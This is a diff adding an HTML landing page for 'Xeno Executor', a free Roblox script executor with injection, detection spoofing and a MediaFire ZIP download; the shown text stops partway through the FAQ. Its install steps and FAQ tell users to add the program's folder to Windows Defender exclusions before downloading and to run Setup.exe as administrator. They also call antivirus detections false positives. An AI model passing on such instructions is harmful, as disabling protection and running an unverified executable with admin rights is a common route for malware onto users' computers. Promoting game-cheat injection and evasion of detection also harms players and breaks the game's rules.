@@ -1,0 +1,884 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Xeno Executor — Best Free Script Executor for Roblox 2026</title>
+    <meta name="description" content="Xeno Executor — free, keyless script executor for Roblox with lightning-fast execution and external script support.">
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+    <!-- Google Fonts: Inter & Space Grotesk -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* ===== Base Styles ===== */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { scroll-behavior: smooth; }
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #050510;
+            color: #e2e8f0;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+        h1, h2, h3, h4, h5, h6 {
+            font-family: 'Space Grotesk', sans-serif;
+        }
+
+        /* ===== Animated Gradient Background ===== */
+        .bg-mesh {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: -2;
+            background:
+                radial-gradient(ellipse 80% 50% at 20% 20%, rgba(120, 50, 255, 0.15), transparent),
+                radial-gradient(ellipse 60% 40% at 80% 80%, rgba(0, 200, 255, 0.1), transparent),
+                radial-gradient(ellipse 50% 60% at 50% 50%, rgba(255, 50, 150, 0.05), transparent);
+            animation: meshFloat 20s ease-in-out infinite alternate;
+        }
+        @keyframes meshFloat {
+            0% { transform: scale(1) translate(0, 0); }
+            100% { transform: scale(1.1) translate(-2%, -2%); }
+        }
+
+        /* ===== Particle Grid ===== */
+        .particles {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: -1;
+            background-image:
+                radial-gradient(circle at 10% 20%, rgba(255,255,255,0.03) 1px, transparent 1px),
+                radial-gradient(circle at 90% 40%, rgba(255,255,255,0.02) 1px, transparent 1px),
+                radial-gradient(circle at 30% 70%, rgba(255,255,255,0.03) 1px, transparent 1px),
+                radial-gradient(circle at 70% 90%, rgba(255,255,255,0.02) 1px, transparent 1px);
+            background-size: 200px 200px, 300px 300px, 250px 250px, 350px 350px;
+            animation: particleMove 30s linear infinite;
+        }
+        @keyframes particleMove {
+            0% { transform: translate(0, 0); }
+            100% { transform: translate(-50px, -50px); }
+        }
+
+        /* ===== Glass Cards ===== */
+        .glass {
+            background: rgba(255, 255, 255, 0.04);
+            backdrop-filter: blur(20px) saturate(180%);
+            -webkit-backdrop-filter: blur(20px) saturate(180%);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 1.25rem;
+            transition: all 0.4s cubic-bezier(0.25, 0.8, 0.25, 1);
+        }
+        .glass:hover {
+            background: rgba(255, 255, 255, 0.07);
+            border-color: rgba(255, 255, 255, 0.15);
+            transform: translateY(-4px);
+            box-shadow: 0 20px 60px rgba(120, 50, 255, 0.15);
+        }
+
+        /* ===== Gradient Text ===== */
+        .gradient-text {
+            background: linear-gradient(135deg, #a855f7, #06b6d4, #ec4899);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .gradient-text-2 {
+            background: linear-gradient(135deg, #06b6d4, #a855f7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        /* ===== Buttons ===== */
+        .btn-primary {
+            background: linear-gradient(135deg, #7c3aed, #06b6d4);
+            color: #fff;
+            border: none;
+            border-radius: 0.75rem;
+            padding: 0.9rem 2rem;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.6rem;
+        }
+        .btn-primary::before {
+            content: '';
+            position: absolute;
+            top: 0; left: -100%;
+            width: 100%; height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s ease;
+        }
+        .btn-primary:hover::before {
+            left: 100%;
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 40px rgba(124, 58, 237, 0.4);
+        }
+        .btn-secondary {
+            background: transparent;
+            color: #e2e8f0;
+            border: 1px solid rgba(255,255,255,0.15);
+            border-radius: 0.75rem;
+            padding: 0.9rem 2rem;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.6rem;
+        }
+        .btn-secondary:hover {
+            border-color: rgba(255,255,255,0.3);
+            background: rgba(255,255,255,0.05);
+            transform: translateY(-2px);
+        }
+
+        /* ===== Pulsing Dot ===== */
+        .pulse-dot {
+            width: 10px; height: 10px;
+            background: #22c55e;
+            border-radius: 50%;
+            display: inline-block;
+            animation: pulse 2s ease-in-out infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { box-shadow: 0 0 0 0 rgba(34, 197, 94, 0.6); }
+            50% { box-shadow: 0 0 0 10px rgba(34, 197, 94, 0); }
+        }
+
+        /* ===== Fade-in Animation ===== */
+        .fade-in {
+            opacity: 0;
+            transform: translateY(30px);
+            transition: opacity 0.8s ease, transform 0.8s ease;
+        }
+        .fade-in.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* ===== Custom Scrollbar ===== */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #0a0a1a; }
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(135deg, #7c3aed, #06b6d4);
+            border-radius: 10px;
+        }
+
+        /* ===== Navigation ===== */
+        .nav-blur {
+            background: rgba(5, 5, 16, 0.7);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+
+        /* ===== Glow ===== */
+        .glow-purple { box-shadow: 0 0 60px rgba(124, 58, 237, 0.3); }
+        .glow-cyan { box-shadow: 0 0 60px rgba(6, 182, 212, 0.3); }
+
+        /* ===== Feature Icons ===== */
+        .feature-icon {
+            width: 48px; height: 48px;
+            border-radius: 0.75rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.25rem;
+            flex-shrink: 0;
+        }
+        .icon-purple { background: rgba(124, 58, 237, 0.15); color: #a855f7; }
+        .icon-cyan { background: rgba(6, 182, 212, 0.15); color: #22d3ee; }
+        .icon-pink { background: rgba(236, 72, 153, 0.15); color: #f472b6; }
+        .icon-green { background: rgba(34, 197, 94, 0.15); color: #4ade80; }
+        .icon-amber { background: rgba(245, 158, 11, 0.15); color: #fbbf24; }
+        .icon-blue { background: rgba(59, 130, 246, 0.15); color: #60a5fa; }
+
+        /* ===== Comparison Table ===== */
+        .compare-table th, .compare-table td {
+            padding: 0.75rem 1rem;
+            text-align: center;
+            border-bottom: 1px solid rgba(255,255,255,0.06);
+        }
+        .compare-table th {
+            font-weight: 600;
+            color: #a855f7;
+            font-size: 0.85rem;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+        .compare-table td { font-size: 0.95rem; }
+        .compare-table tr:last-child td { border-bottom: none; }
+
+        /* ===== Responsive ===== */
+        @media (max-width: 768px) {
+            .hero-title { font-size: 2.2rem !important; }
+            .section-title { font-size: 1.8rem !important; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Background Layers -->
+    <div class="bg-mesh"></div>
+    <div class="particles"></div>
+
+    <!-- ===== NAVIGATION ===== -->
+    <nav class="fixed top-0 left-0 right-0 z-50 nav-blur">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
+            <a href="#" class="flex items-center gap-3 group">
+                <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-purple-600 to-cyan-500 flex items-center justify-center text-white font-bold text-lg shadow-lg shadow-purple-500/30">
+                    X
+                </div>
+                <span class="text-xl font-bold font-['Space_Grotesk'] text-white group-hover:text-purple-400 transition-colors">
+                    Xeno<span class="text-purple-400">.</span>
+                </span>
+            </a>
+            <div class="hidden md:flex items-center gap-8">
+                <a href="#features" class="text-sm text-gray-400 hover:text-white transition-colors font-medium">Features</a>
+                <a href="#install" class="text-sm text-gray-400 hover:text-white transition-colors font-medium">Installation</a>
+                <a href="#requirements" class="text-sm text-gray-400 hover:text-white transition-colors font-medium">Requirements</a>
+                <a href="#faq" class="text-sm text-gray-400 hover:text-white transition-colors font-medium">FAQ</a>
+            </div>
+            <a href="https://www.mediafire.com/file/4wkcs25mguiycil/Xeno_Executor.zip/file" target="_blank"
+               class="btn-primary text-sm !py-2.5 !px-5">
+                <i class="fas fa-download"></i>
+                Download
+            </a>
+        </div>
+    </nav>
+
+    <!-- ===== HERO ===== -->
+    <section class="relative min-h-screen flex items-center justify-center px-6 pt-24 pb-16">
+        <div class="max-w-5xl mx-auto text-center">
+            <!-- Badge -->
+            <div class="fade-in inline-flex items-center gap-2 glass px-4 py-2 rounded-full mb-8">
+                <span class="pulse-dot"></span>
+                <span class="text-sm text-gray-300 font-medium">Works after Roblox update 649.x</span>
+            </div>
+
+            <!-- Title -->
+            <h1 class="hero-title fade-in text-5xl md:text-7xl lg:text-8xl font-bold leading-tight mb-6" style="transition-delay: 0.1s">
+                <span class="text-white">Xeno</span>
+                <span class="gradient-text"> Executor</span>
+            </h1>
+
+            <!-- Subtitle -->
+            <p class="fade-in text-lg md:text-xl text-gray-400 max-w-2xl mx-auto mb-10 leading-relaxed" style="transition-delay: 0.2s">
+                Free script executor for Roblox with <span class="text-purple-400 font-medium">UNC Level 7</span>,
+                external script support, and a simple interface — <span class="text-cyan-400 font-medium">completely keyless</span>.
+            </p>
+
+            <!-- Buttons -->
+            <div class="fade-in flex flex-col sm:flex-row items-center justify-center gap-4 mb-12" style="transition-delay: 0.3s">
+                <a href="https://www.mediafire.com/file/4wkcs25mguiycil/Xeno_Executor.zip/file" target="_blank" class="btn-primary text-lg !py-4 !px-8">
+                    <i class="fas fa-download"></i>
+                    Download Xeno Executor
+                </a>
+                <a href="#features" class="btn-secondary text-lg !py-4 !px-8">
+                    <i class="fas fa-chevron-down"></i>
+                    Learn More
+                </a>
+            </div>
+
+            <!-- Mini Stats -->
+            <div class="fade-in flex flex-wrap justify-center gap-8 md:gap-16" style="transition-delay: 0.4s">
+                <div class="text-center">
+                    <div class="text-3xl md:text-4xl font-bold text-white font-['Space_Grotesk']">75%</div>
+                    <div class="text-sm text-gray-500 mt-1">UNC compatibility</div>
+                </div>
+                <div class="text-center">
+                    <div class="text-3xl md:text-4xl font-bold text-white font-['Space_Grotesk']">0</div>
+                    <div class="text-sm text-gray-500 mt-1">No keys, no waiting</div>
+                </div>
+                <div class="text-center">
+                    <div class="text-3xl md:text-4xl font-bold text-white font-['Space_Grotesk']">v1.3.30</div>
+                    <div class="text-sm text-gray-500 mt-1">Latest version</div>
+                </div>
+                <div class="text-center">
+                    <div class="text-3xl md:text-4xl font-bold text-white font-['Space_Grotesk']">100+</div>
+                    <div class="text-sm text-gray-500 mt-1">Scripts in hub</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== FEATURES ===== -->
+    <section id="features" class="relative py-24 px-6">
+        <div class="max-w-6xl mx-auto">
+            <div class="text-center mb-16 fade-in">
+                <span class="text-sm font-semibold text-purple-400 uppercase tracking-widest">Features</span>
+                <h2 class="section-title text-3xl md:text-5xl font-bold text-white mt-3 mb-4">
+                    Everything you need for <span class="gradient-text-2">scripting</span>
+                </h2>
+                <p class="text-gray-400 max-w-2xl mx-auto">
+                    Xeno combines the power of a C++ backend with the convenience of a WPF interface in one tool.
+                </p>
+            </div>
+
+            <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-6">
+                <!-- Card 1 -->
+                <div class="glass p-7 fade-in" style="transition-delay: 0.05s">
+                    <div class="feature-icon icon-purple mb-5">
+                        <i class="fas fa-bolt"></i>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-2">UNC Level 7</h3>
+                    <p class="text-gray-400 text-sm leading-relaxed">
+                        The execution engine handles complex obfuscated Lua and Luau scripts with ~75% UNC compatibility.
+                    </p>
+                </div>
+
+                <!-- Card 2 -->
+                <div class="glass p-7 fade-in" style="transition-delay: 0.1s">
+                    <div class="feature-icon icon-cyan mb-5">
+                        <i class="fas fa-key"></i>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-2">Completely Keyless</h3>
+                    <p class="text-gray-400 text-sm leading-relaxed">
+                        No subscriptions, key generation, or paywalls. Download, run, and you're set.
+                    </p>
+                </div>
+
+                <!-- Card 3 -->
+                <div class="glass p-7 fade-in" style="transition-delay: 0.15s">
+                    <div class="feature-icon icon-green mb-5">
+                        <i class="fas fa-sync-alt"></i>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-2">Auto-Update</h3>
+                    <p class="text-gray-400 text-sm leading-relaxed">
+                        The engine syncs with Roblox patches automatically — the injector is always ready.
+                    </p>
+                </div>
+
+                <!-- Card 4 -->
+                <div class="glass p-7 fade-in" style="transition-delay: 0.2s">
+                    <div class="feature-icon icon-pink mb-5">
+                        <i class="fas fa-layer-group"></i>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-2">Multi-Instance</h3>
+                    <p class="text-gray-400 text-sm leading-relaxed">
+                        Run scripts simultaneously in multiple Roblox windows without conflicts.
+                    </p>
+                </div>
+
+                <!-- Card 5 -->
+                <div class="glass p-7 fade-in" style="transition-delay: 0.25s">
+                    <div class="feature-icon icon-amber mb-5">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-2">HttpSpy & Spoofing</h3>
+                    <p class="text-gray-400 text-sm leading-relaxed">
+                        Monitor HTTP traffic in games and mask the executor's presence from detection scripts.
+                    </p>
+                </div>
+
+                <!-- Card 6 -->
+                <div class="glass p-7 fade-in" style="transition-delay: 0.3s">
+                    <div class="feature-icon icon-blue mb-5">
+                        <i class="fas fa-database"></i>
+                    </div>
+                    <h3 class="text-xl font-bold text-white mb-2">Virtual FS</h3>
+                    <p class="text-gray-400 text-sm leading-relaxed">
+                        High-performance in-memory file handling for scripts with persistent data storage.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== COMPARISON ===== -->
+    <section class="relative py-24 px-6">
+        <div class="max-w-4xl mx-auto">
+            <div class="text-center mb-16 fade-in">
+                <span class="text-sm font-semibold text-cyan-400 uppercase tracking-widest">Comparison</span>
+                <h2 class="section-title text-3xl md:text-5xl font-bold text-white mt-3 mb-4">
+                    Xeno vs <span class="gradient-text">competitors</span>
+                </h2>
+                <p class="text-gray-400 max-w-2xl mx-auto">
+                    Why Xeno stands out among popular alternatives in 2026.
+                </p>
+            </div>
+
+            <div class="glass p-6 md:p-8 overflow-x-auto fade-in">
+                <table class="compare-table w-full min-w-[500px]">
+                    <thead>
+                        <tr>
+                            <th class="text-left">Feature</th>
+                            <th>Xeno</th>
+                            <th>KRNL</th>
+                            <th>Fluxus</th>
+                            <th>Synapse Z</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td class="text-left text-gray-300">Price</td>
+                            <td class="text-green-400">Free</td>
+                            <td class="text-green-400">Free</td>
+                            <td class="text-green-400">Free</td>
+                            <td class="text-green-400">Free</td>
+                        </tr>
+                        <tr>
+                            <td class="text-left text-gray-300">Key</td>
+                            <td class="text-green-400">❌ No</td>
+                            <td class="text-red-400">✅ Yes</td>
+                            <td class="text-red-400">✅ Yes</td>
+                            <td class="text-green-400">❌ No</td>
+                        </tr>
+                        <tr>
+                            <td class="text-left text-gray-300">UNC level</td>
+                            <td class="text-purple-400 font-semibold">Level 7</td>
+                            <td class="text-gray-400">Level 5</td>
+                            <td class="text-gray-400">Level 4</td>
+                            <td class="text-purple-400 font-semibold">Level 7</td>
+                        </tr>
+                        <tr>
+                            <td class="text-left text-gray-300">Multi-instance</td>
+                            <td class="text-green-400">✅</td>
+                            <td class="text-red-400">❌</td>
+                            <td class="text-red-400">❌</td>
+                            <td class="text-green-400">✅</td>
+                        </tr>
+                        <tr>
+                            <td class="text-left text-gray-300">HttpSpy</td>
+                            <td class="text-green-400">✅</td>
+                            <td class="text-red-400">❌</td>
+                            <td class="text-red-400">❌</td>
+                            <td class="text-red-400">❌</td>
+                        </tr>
+                        <tr>
+                            <td class="text-left text-gray-300">Mobile support</td>
+                            <td class="text-green-400">✅ Beta APK</td>
+                            <td class="text-red-400">❌</td>
+                            <td class="text-red-400">❌</td>
+                            <td class="text-green-400">✅ Beta</td>
+                        </tr>
+                        <tr>
+                            <td class="text-left text-gray-300">Open source</td>
+                            <td class="text-green-400">✅ GitHub</td>
+                            <td class="text-red-400">❌</td>
+                            <td class="text-red-400">❌</td>
+                            <td class="text-red-400">❌</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== INSTALLATION ===== -->
+    <section id="install" class="relative py-24 px-6">
+        <div class="max-w-4xl mx-auto">
+            <div class="text-center mb-16 fade-in">
+                <span class="text-sm font-semibold text-purple-400 uppercase tracking-widest">Installation</span>
+                <h2 class="section-title text-3xl md:text-5xl font-bold text-white mt-3 mb-4">
+                    How to <span class="gradient-text-2">install</span> Xeno
+                </h2>
+                <p class="text-gray-400 max-w-2xl mx-auto">
+                    A simple 7-step process — from download to your first executed script.
+                </p>
+            </div>
+
+            <div class="grid gap-4">
+                <!-- Step 1 -->
+                <div class="glass p-6 flex items-start gap-5 fade-in" style="transition-delay: 0.05s">
+                    <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-purple-600 to-cyan-500 flex items-center justify-center text-white font-bold text-sm flex-shrink-0">
+                        1
+                    </div>
+                    <div>
+                        <h3 class="text-white font-semibold mb-1">Download the ZIP archive</h3>
+                        <p class="text-gray-400 text-sm">
+                            Click the button below to download the official
+                            <a href="https://www.mediafire.com/file/4wkcs25mguiycil/Xeno_Executor.zip/file" target="_blank" class="text-purple-400 hover:text-purple-300 underline underline-offset-2">Xeno_Executor.zip</a> installer.
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Step 2 -->
+                <div class="glass p-6 flex items-start gap-5 fade-in" style="transition-delay: 0.1s">
+                    <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-purple-600 to-cyan-500 flex items-center justify-center text-white font-bold text-sm flex-shrink-0">
+                        2
+                    </div>
+                    <div>
+                        <h3 class="text-white font-semibold mb-1">Extract the archive</h3>
+                        <p class="text-gray-400 text-sm">
+                            Extract the contents of the ZIP to a folder of your choice, e.g., <code class="bg-white/5 px-1.5 py-0.5 rounded text-cyan-400 text-xs">C:\Xeno</code>.
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Step 3 -->
+                <div class="glass p-6 flex items-start gap-5 fade-in" style="transition-delay: 0.15s">
+                    <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-purple-600 to-cyan-500 flex items-center justify-center text-white font-bold text-sm flex-shrink-0">
+                        3
+                    </div>
+                    <div>
+                        <h3 class="text-white font-semibold mb-1">Add to Defender exclusions</h3>
+                        <p class="text-gray-400 text-sm">
+                            Before launching, add the Xeno folder to Windows Defender exclusions to avoid a false positive.
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Step 4 -->
+                <div class="glass p-6 flex items-start gap-5 fade-in" style="transition-delay: 0.2s">
+                    <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-purple-600 to-cyan-500 flex items-center justify-center text-white font-bold text-sm flex-shrink-0">
+                        4
+                    </div>
+                    <div>
+                        <h3 class="text-white font-semibold mb-1">Run Setup.exe</h3>
+                        <p class="text-gray-400 text-sm">
+                            Open the folder and run <code class="bg-white/5 px-1.5 py-0.5 rounded text-cyan-400 text-xs">Setup.exe</code> as administrator.
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Step 5 -->
+                <div class="glass p-6 flex items-start gap-5 fade-in" style="transition-delay: 0.25s">
+                    <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-purple-600 to-cyan-500 flex items-center justify-center text-white font-bold text-sm flex-shrink-0">
+                        5
+                    </div>
+                    <div>
+                        <h3 class="text-white font-semibold mb-1">Launch Roblox</h3>
+                        <p class="text-gray-400 text-sm">
+                            Open Roblox and join any game.
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Step 6 -->
+                <div class="glass p-6 flex items-start gap-5 fade-in" style="transition-delay: 0.3s">
+                    <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-purple-600 to-cyan-500 flex items-center justify-center text-white font-bold text-sm flex-shrink-0">
+                        6
+                    </div>
+                    <div>
+                        <h3 class="text-white font-semibold mb-1">Click Inject</h3>
+                        <p class="text-gray-400 text-sm">
+                            In the Xeno interface, click the <span class="text-green-400 font-medium">Inject</span> button and wait for the green confirmation.
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Step 7 -->
+                <div class="glass p-6 flex items-start gap-5 fade-in" style="transition-delay: 0.35s">
+                    <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-purple-600 to-cyan-500 flex items-center justify-center text-white font-bold text-sm flex-shrink-0">
+                        7
+                    </div>
+                    <div>
+                        <h3 class="text-white font-semibold mb-1">Load a script and click Execute</h3>
+                        <p class="text-gray-400 text-sm">
+                            Paste your script or choose from the hub, then click <span class="text-purple-400 font-medium">Execute</span>.
+                        </p>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Big Download Button -->
+            <div class="text-center mt-12 fade-in">
+                <a href="https://www.mediafire.com/file/4wkcs25mguiycil/Xeno_Executor.zip/file" target="_blank"
+                   class="btn-primary text-lg !py-5 !px-12 glow-purple">
+                    <i class="fas fa-download text-xl"></i>
+                    Download Xeno Executor (Windows)
+                </a>
+                <p class="text-gray-500 text-sm mt-4">
+                    <i class="fas fa-lock mr-1"></i> Official MediaFire link from the repository README
+                </p>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== SYSTEM REQUIREMENTS ===== -->
+    <section id="requirements" class="relative py-24 px-6">
+        <div class="max-w-4xl mx-auto">
+            <div class="text-center mb-16 fade-in">
+                <span class="text-sm font-semibold text-cyan-400 uppercase tracking-widest">Requirements</span>
+                <h2 class="section-title text-3xl md:text-5xl font-bold text-white mt-3 mb-4">
+                    System <span class="gradient-text">requirements</span>
+                </h2>
+            </div>
+
+            <div class="grid md:grid-cols-2 gap-6">
+                <!-- Minimum -->
+                <div class="glass p-8 fade-in" style="transition-delay: 0.05s">
+                    <div class="flex items-center gap-3 mb-6">
+                        <div class="feature-icon icon-amber">
+                            <i class="fas fa-microchip"></i>
+                        </div>
+                        <h3 class="text-xl font-bold text-white">Minimum</h3>
+                    </div>
+                    <ul class="space-y-3 text-sm">
+                        <li class="flex items-start gap-3">
+                            <i class="fas fa-check text-green-400 mt-1"></i>
+                            <span class="text-gray-400"><strong class="text-gray-200">OS:</strong> Windows 10 64-bit (Build 19041+)</span>
+                        </li>
+                        <li class="flex items-start gap-3">
+                            <i class="fas fa-check text-green-400 mt-1"></i>
+                            <span class="text-gray-400"><strong class="text-gray-200">CPU:</strong> Intel Core i3 / AMD Ryzen 3</span>
+                        </li>
+                        <li class="flex items-start gap-3">
+                            <i class="fas fa-check text-green-400 mt-1"></i>
+                            <span class="text-gray-400"><strong class="text-gray-200">RAM:</strong> 4 GB</span>
+                        </li>
+                        <li class="flex items-start gap-3">
+                            <i class="fas fa-check text-green-400 mt-1"></i>
+                            <span class="text-gray-400"><strong class="text-gray-200">Storage:</strong> 200 MB free space</span>
+                        </li>
+                        <li class="flex items-start gap-3">
+                            <i class="fas fa-check text-green-400 mt-1"></i>
+                            <span class="text-gray-400"><strong class="text-gray-200">Runtime:</strong> .NET 6.0+, Visual C++ Redistributable 2022</span>
+                        </li>
+                    </ul>
+                </div>
+
+                <!-- Recommended -->
+                <div class="glass p-8 fade-in glow-cyan" style="transition-delay: 0.1s">
+                    <div class="flex items-center gap-3 mb-6">
+                        <div class="feature-icon icon-cyan">
+                            <i class="fas fa-rocket"></i>
+                        </div>
+                        <h3 class="text-xl font-bold text-white">Recommended</h3>
+                    </div>
+                    <ul class="space-y-3 text-sm">
+                        <li class="flex items-start gap-3">
+                            <i class="fas fa-check text-cyan-400 mt-1"></i>
+                            <span class="text-gray-400"><strong class="text-gray-200">OS:</strong> Windows 11</span>
+                        </li>
+                        <li class="flex items-start gap-3">
+                            <i class="fas fa-check text-cyan-400 mt-1"></i>
+                            <span class="text-gray-400"><strong class="text-gray-200">CPU:</strong> Intel Core i5 / AMD Ryzen 5</span>
+                        </li>
+                        <li class="flex items-start gap-3">
+                            <i class="fas fa-check text-cyan-400 mt-1"></i>
+                            <span class="text-gray-400"><strong class="text-gray-200">RAM:</strong> 8 GB</span>
+                        </li>
+                        <li class="flex items-start gap-3">
+                            <i class="fas fa-check text-cyan-400 mt-1"></i>
+                            <span class="text-gray-400"><strong class="text-gray-200">Storage:</strong> 500 MB free space</span>
+                        </li>
+                        <li class="flex items-start gap-3">
+                            <i class="fas fa-check text-cyan-400 mt-1"></i>
+                            <span class="text-gray-400"><strong class="text-gray-200">GPU:</strong> DirectX 11 compatible</span>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+
+            <!-- Platforms -->
+            <div class="mt-8 glass p-6 fade-in">
+                <h4 class="text-white font-semibold mb-4 text-center">Supported platforms</h4>
+                <div class="flex flex-wrap justify-center gap-6">
+                    <div class="flex items-center gap-2 text-gray-300">
+                        <i class="fab fa-windows text-cyan-400 text-xl"></i>
+                        <span class="text-sm font-medium">Windows 10/11</span>
+                    </div>
+                    <div class="flex items-center gap-2 text-gray-300">
+                        <i class="fab fa-apple text-purple-400 text-xl"></i>
+                        <span class="text-sm font-medium">macOS 11+</span>
+                    </div>
+                    <div class="flex items-center gap-2 text-gray-300">
+                        <i class="fab fa-android text-green-400 text-xl"></i>
+                        <span class="text-sm font-medium">Android 8.0+ (Beta)</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== FAQ ===== -->
+    <section id="faq" class="relative py-24 px-6">
+        <div class="max-w-3xl mx-auto">
+            <div class="text-center mb-16 fade-in">
+                <span class="text-sm font-semibold text-purple-400 uppercase tracking-widest">FAQ</span>
+                <h2 class="section-title text-3xl md:text-5xl font-bold text-white mt-3 mb-4">
+                    Frequently asked <span class="gradient-text-2">questions</span>
+                </h2>
+            </div>
+
+            <div class="space-y-4">
+                <!-- Question 1 -->
+                <details class="glass p-6 group fade-in" style="transition-delay: 0.05s">
+                    <summary class="flex items-center justify-between cursor-pointer list-none">
+                        <h3 class="text-white font-semibold text-base pr-4">Is Xeno safe to use?</h3>
+                        <i class="fas fa-chevron-down text-purple-400 transition-transform group-open:rotate-180"></i>
+                    </summary>
+                    <p class="text-gray-400 text-sm mt-4 leading-relaxed">
+                        Yes. Xeno is open source on GitHub and can be audited by the community. Antivirus detections are false positives due to the low-level injection mechanism, not actual threats. Download only from the official GitHub page and links in the README.
+                    </p>
+                </details>
+
+                <!-- Question 2 -->
+                <details class="glass p-6 group fade-in" style="transition-delay: 0.1s">
+                    <summary class="flex items-center justify-between cursor-pointer list-none">
+                        <h3 class="text-white font-semibold text-base pr-4">Do I need a key to use Xeno?</h3>
+                        <i class="fas fa-chevron-down text-purple-400 transition-transform group-open:rotate-180"></i>
+                    </summary>
+                    <p class="text-gray-400 text-sm mt-4 leading-relaxed">
+                        No. Xeno is completely keyless. No keys, wait timers, or third-party links. Download, run, and you're good to go.
+                    </p>
+                </details>
+
+                <!-- Question 3 -->
+                <details class="glass p-6 group fade-in" style="transition-delay: 0.15s">
+                    <summary class="flex items-center justify-between cursor-pointer list-none">
+                        <h3 class="text-white font-semibold text-base pr-4">Windows Defender deletes xeno.exe — what to do?</h3>
+                        <i class="fas fa-chevron-down text-purple-400 transition-transform group-open:rotate-180"></i>
+                    </summary>
+                    <p class="text-gray-400 text-sm mt-4 leading-relaxed">
+                        This is a false positive. Add the Xeno folder to Windows Defender exclusions <em>before</em> downloading, then re-download from the official link. Do not disable your antivirus entirely — adding an exclusion is sufficient.
+                    </p>
+                </details>
+
+                <!-- Question 4 -->
+                <details class="glass p-6 group fade-in" style="transition-delay: 0.2s">
+                    <summary class="flex items-center justify-between cursor-pointer list-none">
+                        <h3 class="text-white font-semibold text-base pr-4">Injection fails after a Roblox update</h3>
+                        <i class="fas fa-chevron-down text-purple-400 transition-transform group-open:rotate-180"></i>
+                    </summary>
+                    <p class="text-gray-400 text-sm mt-4 leading-relaxed">
+                        Roblox has likely updated since your last session. Check for a Xeno update via the auto-updater, fully restart both Roblox and Xeno, then try again.
+                    </p>
+                </details>
+
+                <!-- Question 5 -->
+                <details class="glass p-6 group fade-in" style="transition-delay: 0.25s">
+                    <summary class="flex items-center justify-between cursor-pointer list-none">
+                        <h3 class="text-white font-semibold text-base pr-4">Is there a mobile version?</h3>
+                        <i class="fas fa-chevron-down text-purple-400 transition-transform group-open:rotate-180"></i>
+                    </summary>
+                    <p class="text-gray-400 text-sm mt-4 leading-relaxed">
+                        Yes, an Android APK Beta is available for Android 8.0+. An iOS version is in development. Use only the official links from the repository.
+                    </p>
+                </details>
+
+                <!-- Question 6 -->
+                <details class="glass p-6 group fade-in" style="transition-delay: 0.3s">
+                    <summary class="flex items-center justify-between cursor-pointer list-none">
+                        <h3 class="text-white font-semibold text-base pr-4">Where can I find the source code and support?</h3>
